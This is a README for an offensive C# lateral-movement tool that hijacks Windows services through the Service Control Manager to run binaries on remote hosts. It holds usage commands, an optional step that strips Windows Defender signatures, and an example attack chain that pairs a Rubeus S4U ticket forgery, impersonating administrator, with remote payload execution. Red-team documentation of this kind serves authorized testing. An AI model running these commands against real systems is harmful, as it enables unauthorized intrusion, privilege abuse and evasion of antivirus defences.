# FilelessLateralMovement

FilelessLateralMovement is a C# tool designed to execute arbitrary binaries on remote Windows hosts by abusing the Service Control Manager (SCM) and existing services. It supports an optional Defender bypass step and is particularly useful in post-exploitation scenarios, such as after exploiting Kerberos Constrained Delegation (KCD).

## 🚀 Features

- Remote execution via SCM  
- Optional Windows Defender signature removal  
- Restores original service configuration after execution  
- Compatible with Kerberos Constrained Delegation (`S4U2Self` + `S4U2Proxy`)  
- Written in pure C#, no PowerShell required

## 💥 Usage

```
FilelessLateralMovement.exe [TargetHost] [ServiceName] [BinaryToRun] [--skip-defender (optional)]
```

### 🔧 Arguments

| Argument         | Description                                          |
|------------------|-----------------------------------------------------|
| TargetHost      | Hostname or IP address of the remote system         |
| ServiceName     | Short name of the target service (not display name) |
| BinaryToRun     | Full path or command to execute on the remote system |
| --skip-defender | *(Optional)* Skip Windows Defender bypass step      |

### ⚡ Examples

**With Defender bypass**
```
FilelessLateralMovement.exe appsrv01 SensorService "C:\Windows\Temp\payload.exe"
```

**Without Defender bypass**
```
FilelessLateralMovement.exe appsrv01 SensorService "C:\Windows\Temp\payload.exe" --skip-defender
```

## 🔥 Example Attack Chain (Constrained Delegation)

1. Obtain a TGS using Rubeus:
```
Rubeus.exe s4u /user:attackersystem$ /rc4:<HASH> /impersonateuser:administrator /msdsspn:cifs/file05 /ptt
```

2. Execute remote payload:
```
FilelessLateralMovement.exe file05 SensorService "C:\Windows\Temp\payload.exe"
```

## ⚠️ Disclaimer

This tool is intended **for educational and authorized security testing purposes only**. Do not use it against systems you do not have explicit permission to test.


